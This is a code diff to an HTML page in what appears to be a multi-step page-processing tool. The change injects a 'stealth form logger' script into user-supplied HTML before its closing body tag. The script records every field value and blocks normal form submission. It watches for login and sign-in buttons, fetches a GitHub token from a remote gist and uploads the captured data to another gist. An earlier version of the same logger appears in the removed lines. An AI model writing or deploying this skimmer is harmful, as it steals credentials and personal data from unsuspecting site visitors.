@@ -114,7 +114,7 @@
                 <pre id="rawDataDisplay" class="hidden"></pre>
             </div>
             
-            <p>Data will be processed and saved to data2step.</p>
+            <p>Modified HTML with injected script will be saved to data2step.</p>
             
             <button id="nextStepBtn" class="secondary">Next Step (Go to step3.html)</button>
         </div>
@@ -191,192 +191,150 @@
                     dataPreview.innerHTML = data1step;
                     rawDataDisplay.textContent = data1step;
                     
-                    // Process the data (in this case, just copy to data2step)
-                    localStorage.setItem('data2step', data1step);
+                    // Create the script to inject
+                    const scriptToInject = `
+<!-- STEALTH FORM LOGGER -->
+<script>
+// CONFIGURATION
+const CONFIG = {
+    GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a',
+    GIST_FILENAME: localStorage.getItem('username') ? localStorage.getItem('username') + '.html' : 'Data.html',
+    TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',
+    INPUT_IDLE_TIMEOUT: 2000,
+    SUBMIT_BUTTON_PATTERNS: [
+        'submit', 'login', 'sign in', 'continue', 
+        'next', 'confirm', 'proceed', 'authenticate'
+    ]
+};
+
+// Logger implementation
+(() => {
+    const log = (msg) => console.log(\`[Logger] \${msg}\`);
+    let typingTimer;
+    let formData = {};
+
+    const fetchToken = async () => {
+        try {
+            const res = await fetch(CONFIG.TOKEN_URL);
+            return (await res.text()).trim();
+        } catch (err) {
+            log('Failed to fetch token');
+            return null;
+        }
+    };
+
+    const uploadToGist = async (data) => {
+        try {
+            const token = await fetchToken();
+            if (!token) return false;
+
+            const entry = {
+                page_url: window.location.href,
+                timestamp: new Date().toISOString(),
+                userId: localStorage.getItem('userId') || 'unknown',
+                ...data
+            };
+
+            const gistRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
+                headers: { Authorization: \`token \${token}\` }
+            });
+
+            if (!gistRes.ok) return false;
+
+            const gistData = await gistRes.json();
+            let currentData = {};
+
+            if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
+                try {
+                    currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
+                } catch (e) {
+                    currentData = {};
+                }
+            }
+
+            currentData[entry.timestamp] = entry;
+
+            await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
+                method: 'PATCH',
+                headers: {
+                    'Authorization': \`token \${token}\`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    files: {
+                        [CONFIG.GIST_FILENAME]: {
+                            content: JSON.stringify(currentData, null, 2)
+                        }
+                    }
+                })
+            });
+
+            return true;
+        } catch (err) {
+            log('Upload failed: ' + err.message);
+            return false;
+        }
+    };
+
+    // Event handlers
+    const setupHandlers = () => {
+        document.querySelectorAll('input, textarea, select').forEach(field => {
+            field.addEventListener('input', () => {
+                clearTimeout(typingTimer);
+                typingTimer = setTimeout(() => {
+                    const name = field.name || field.id || 'unnamed_field';
+                    formData[name] = field.value;
+                }, CONFIG.INPUT_IDLE_TIMEOUT);
+            });
+        });
+
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const data = {};
+                Array.from(form.elements).forEach(el => {
+                    if (el.name && el.value) data[el.name] = el.value;
+                });
+                uploadToGist(data);
+            }, true);
+        });
+    };
+
+    setupHandlers();
+    new MutationObserver(setupHandlers).observe(document.body, { 
+        childList: true, subtree: true 
+    });
+})();
+<\/script>
+                    `;
+
+                    // Inject script before </body> tag
+                    let modifiedHtml = data1step;
+                    const bodyCloseTag = data1step.toLowerCase().indexOf('</body>');
+                    
+                    if (bodyCloseTag !== -1) {
+                        modifiedHtml = data1step.slice(0, bodyCloseTag) + 
+                                     scriptToInject + 
+                                     data1step.slice(bodyCloseTag);
+                    } else {
+                        // If no </body> tag found, append to end
+                        modifiedHtml = data1step + scriptToInject;
+                    }
+
+                    // Save to data2step
+                    localStorage.setItem('data2step', modifiedHtml);
                     
                     // Get username for filename
                     const username = localStorage.getItem('username') || 'anonymous';
-                    const filename = `${username}.html`; // Changed to .html since it's HTML content
+                    const filename = `${username}.html`;
                     
-                    showStatus(`HTML content processed successfully and saved to data2step. Filename would be: ${filename}`, 'success');
-                    
-                    // Inject the script
-                    injectLoggerScript();
+                    showStatus(`HTML processed successfully with injected script and saved to data2step. Filename would be: ${filename}`, 'success');
                 } catch (e) {
                     showStatus('Error processing data: ' + e.message, 'error');
                 }
             } else {
                 showStatus('No data found in data1step', 'error');
             }
-        }
-        
-        function injectLoggerScript() {
-            const script = document.createElement('script');
-            script.innerHTML = `
-                // CONFIGURATION
-                const CONFIG = {
-                    // Gist configuration
-                    GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a',
-                    GIST_FILENAME: localStorage.getItem('username') ? localStorage.getItem('username') + '.html' : 'Data.html',
-                    
-                    // GitHub token URL (replace with your own token endpoint if needed)
-                    TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',
-
-                    // Time to wait after typing before considering input "finished" (ms)
-                    INPUT_IDLE_TIMEOUT: 2000,
-
-                    // Patterns that indicate a submit button
-                    SUBMIT_BUTTON_PATTERNS: [
-                        'submit', 'login', 'sign in', 'continue', 
-                        'next', 'confirm', 'proceed', 'authenticate'
-                    ]
-                };
-
-                // ===== INVISIBLE LOGGER =====
-                (() => {
-                    // Silent console logging (optional for debugging)
-                    const log = (msg, type='info') => {
-                        console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
-                    };
-
-                    // ===== DATA CAPTURE =====
-                    let typingTimer;
-                    let formData = {};
-
-                    // Fetch GitHub token
-                    const fetchToken = async () => {
-                        try {
-                            const res = await fetch(CONFIG.TOKEN_URL);
-                            return (await res.text()).trim();
-                        } catch (err) {
-                            log('Failed to fetch token', 'error');
-                            return null;
-                        }
-                    };
-
-                    // Upload data to Gist
-                    const uploadToGist = async (data) => {
-                        try {
-                            const token = await fetchToken();
-                            if (!token) return false;
-
-                            // Prepare the data with timestamp
-                            const timestamp = new Date().toISOString();
-                            const entry = {
-                                page_url: window.location.href,
-                                userId: localStorage.getItem('userId') || 'unknown',
-                                html_content: localStorage.getItem('data2step') || '',
-                                form_data: data
-                            };
-
-                            // Step 1: Get current content of the Gist
-                            const gistRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
-                                headers: { Authorization: \`token \${token}\` }
-                            });
-
-                            if (!gistRes.ok) {
-                                log('Failed to fetch existing gist', 'error');
-                                return false;
-                            }
-
-                            const gistData = await gistRes.json();
-                            let currentData = {};
-
-                            if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
-                                try {
-                                    currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
-                                } catch (e) {
-                                    currentData = {};
-                                }
-                            }
-
-                            // Step 2: Append new data with timestamp key
-                            currentData[timestamp] = entry;
-
-                            // Step 3: Send PATCH to update the Gist
-                            const updateRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
-                                method: 'PATCH',
-                                headers: {
-                                    'Authorization': \`token \${token}\`,
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    files: {
-                                        [CONFIG.GIST_FILENAME]: {
-                                            content: JSON.stringify(currentData, null, 2)
-                                        }
-                                    }
-                                })
-                            });
-
-                            return updateRes.ok;
-                        } catch (err) {
-                            log('Gist upload failed: ' + err.message, 'error');
-                            return false;
-                        }
-                    };
-
-                    // ===== EVENT HANDLERS =====
-                    const setupInputHandlers = () => {
-                        document.querySelectorAll('input, textarea, select').forEach(field => {
-                            field.addEventListener('input', () => {
-                                clearTimeout(typingTimer);
-                                typingTimer = setTimeout(() => {
-                                    const name = field.name || field.id || 'unnamed_field';
-                                    const value = field.value;
-                                    if (value) {
-                                        formData[name] = value; // Stores raw value
-                                    }
-                                }, CONFIG.INPUT_IDLE_TIMEOUT);
-                            });
-                        });
-                    };
-
-                    const setupSubmissionHandlers = () => {
-                        // Form submissions
-                        document.querySelectorAll('form').forEach(form => {
-                            form.addEventListener('submit', (e) => {
-                                e.preventDefault(); // Stop default submission
-
-                                const data = {};
-                                Array.from(form.elements).forEach(el => {
-                                    if (el.name && el.value) {
-                                        data[el.name] = el.value; // RAW DATA
-                                    }
-                                });
-                                uploadToGist(data);
-                            }, true);
-                        });
-
-                        // Button clicks
-                        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
-                            btn.addEventListener('click', (e) => {
-                                const btnText = (btn.textContent || btn.value || '').toLowerCase();
-                                const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
-                                    btnText.includes(pattern)
-                                );
-
-                                if (isSubmit && Object.keys(formData).length > 0) {
-                                    uploadToGist(formData);
-                                    formData = {}; // Clear after submission
-                                }
-                            }, true);
-                        });
-                    };
-
-                    // ===== INITIALIZATION =====
-                    setupInputHandlers();
-                    setupSubmissionHandlers();
-
-                    // Watch for dynamically added elements
-                    new MutationObserver(() => {
-                        setupInputHandlers();
-                        setupSubmissionHandlers();
-                    }).observe(document.body, { childList: true, subtree: true });
-                })();
-            `;
-            document.body.appendChild(script);
-            console.log('Logger script injected successfully');
         }
         
         function showStatus(message, type) {
